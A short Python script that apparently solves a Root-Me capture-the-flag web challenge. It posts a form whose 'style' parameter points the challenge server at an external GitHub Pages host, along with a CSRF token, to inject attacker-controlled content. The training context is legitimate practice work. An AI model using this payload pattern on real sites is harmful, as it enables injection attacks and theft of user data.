import requests

data = {"url":"http://challenge01.root-me.org:58005/?style=//kixisaleesd.github.io/test/a", "csrf":"ruW-tjL1BWCdhbiOSC"}
r = requests.post("http://challenge01.root-me.org:58005/?style=light", data=data)
print(r.content)